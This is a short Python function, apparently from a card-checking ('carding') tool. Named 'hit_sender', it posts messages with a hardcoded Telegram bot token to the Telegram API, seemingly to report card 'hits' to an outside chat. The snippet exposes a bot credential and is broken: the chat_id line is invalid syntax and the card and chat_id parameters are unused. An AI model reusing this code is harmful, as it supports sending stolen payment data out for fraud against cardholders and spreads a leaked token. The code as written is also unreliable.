import requests

def hit_sender(card,message,chat_id):
    bot_token = "7393378346:AAHtL-PmrsL5tKpRP_ADEJSyGuEkbo7rxuA"
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': @Xajc_bot, 'text': message}
    requests.post(url, data=data)
